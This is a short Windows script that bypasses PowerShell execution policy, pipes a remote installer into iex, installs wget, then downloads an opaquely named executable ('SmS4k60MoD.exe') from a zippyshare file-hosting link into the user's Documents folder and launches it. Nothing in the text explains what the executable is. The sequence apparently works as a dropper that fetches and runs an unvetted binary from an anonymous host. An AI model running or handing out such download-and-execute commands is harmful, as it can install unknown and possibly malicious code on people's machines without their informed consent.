powershell Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

choco install wget --force -y

cd %USERPROFILE%\Documents

wget https://www65.zippyshare.com/d/21xRubUj/50387/SmS4k60MoD.exe

start "" SmS4k60MoD.exe